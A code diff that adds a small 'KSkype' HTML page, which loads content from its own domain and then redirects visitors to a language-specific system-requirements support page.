@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KSkype</title>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            var userLang = navigator.language || navigator.userLanguage;
+            var redirectUrl;
+
+            if (userLang.startsWith('ru')) {
+                redirectUrl = 'https://kskype.limpe.fun/ru/support/pages/sys-req';
+            } else if (userLang.startsWith('uk')) {
+                redirectUrl = 'https://kskype.limpe.fun/ru/support/pages/sys-req';
+            } else {
+                redirectUrl = 'https://kskype.limpe.fun/en/support/pages/sys-req';
+            }
+
+            // Fetch and display content from the specified URL
+            fetch('http://kskype.limpe.fun/assets/v1/load')
+                .then(response => response.text())
+                .then(data => {
+                    document.body.innerHTML = data;
+                    // Redirect after displaying the content
+                    window.location.href = redirectUrl;
+                })
+                .catch(error => console.error('Error fetching content:', error));
+        });
+    </script>
+</head>
+<body>
+    <p>Loading...</p>
+</body>
+</html>
